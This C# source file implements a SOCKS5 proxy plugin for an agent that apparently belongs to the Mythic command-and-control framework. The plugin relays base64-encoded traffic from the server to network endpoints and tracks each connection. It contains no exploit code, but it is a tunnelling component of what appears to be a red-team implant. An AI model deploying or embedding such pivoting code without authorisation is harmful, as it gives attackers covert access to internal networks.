using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;
using System.Collections.Concurrent;

namespace Agent
{
    public class Plugin : IPlugin, IProxyPlugin
    {
        public string Name => "socks";
        private IMessageManager messageManager { get; set; }
        private ILogger logger { get; set; }
        private ConcurrentDictionary<int, ConnectionConfig> connections { get; set; }
        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
        {
            this.messageManager = messageManager;
            this.connections = new ConcurrentDictionary<int, ConnectionConfig>();
            this.logger = logger;
        }

        public async Task Execute(ServerJob job)
        {
            
        }

        public async Task HandleDatagram(ServerDatagram sm)
        {
            if (!connections.ContainsKey(sm.server_id)) //Check if this is a new connection
            {
                if (!sm.exit)
                {
                    await HandleNewConnection(sm); //Add new connection
                }
                return;
            }

            //We already know about this packet, so lets continue
            if (!string.IsNullOrEmpty(sm.data)) //If the packet contains data we can do something with it
            {
                if (connections[sm.server_id].IsConnected()) //Check if our connection is alive
                {
                    connections[sm.server_id].client.Send(Misc.Base64DecodeToByteArray(sm.data)); //The connection is open still, let's send the packet
                }
            }

            if (sm.exit) //Finally, let's see if exit was set to true
            {
                if (connections[sm.server_id].IsConnected())
                {
                    connections[sm.server_id].exited = true;
                    connections[sm.server_id].client.Disconnect(); //We are, so let's issue the disconnect
                }
                ConnectionConfig ac;
                if (connections.TryRemove(sm.server_id, out ac))//Finally, remove the session from our tracker and dispose of the client
                {
                    if (ac.client is not null)
                    {
                        ac.client.Dispose();
                    }
                }
            }
        }
        /// <summary>
        /// Add a connection to the tracker dictionary
        /// </summary>
        /// <param name="conn">Socks Connection</param>
        public async Task<bool> AddConnection(ConnectionConfig conn)
        {
            return connections.TryAdd(conn.server_id, conn);
        }
        /// <summary>
        /// Handle a new connection forwarded from the Mythic server
        /// </summary>
        /// <param name="address">IP address</param>
        /// <param name="sm">Socks Message</param>
        private async Task HandleNewConnection(ServerDatagram sm)
        {
            try
            {
                if (string.IsNullOrEmpty(sm.data)) //We got an empty packet even though we should be recieving connect data.
                {
                    return;
                }

                ConnectionOptions co = new ConnectionOptions(sm); //Begin to parse the packet 
                if (!co.Parse()) //Check if parsing succeeded or not
                {
                    ReturnMessageFailure(co.server_id); //Packet parse failed.
                    return;
                }

                ConnectionConfig sc = new ConnectionConfig(co, messageManager); //Create Socks Connection Object, and try to connect
                await AddConnection(sc); //Add our connection to the Dictionary;

                sc.client.RunAsync(); //Connect to the endpoint
            }
            catch
            {
                ReturnMessageFailure(sm.server_id);
            }
        }

        public async void ReturnMessageFailure(int id)
        {
            await this.messageManager.AddResponse(
                DatagramSource.Socks5,
                new ServerDatagram(
                    id,
                    new ConnectResponse
                    {
                        bndaddr = new byte[] { 0x01, 0x00, 0x00, 0x7F },
                        bndport = new byte[] { 0x00, 0x00 },
                        addrtype = (byte)AddressType.IPv4,
                        status = ConnectResponseStatus.GeneralFailure,
                    }.ToByte(),
                    true
                ));
        }
    }
}
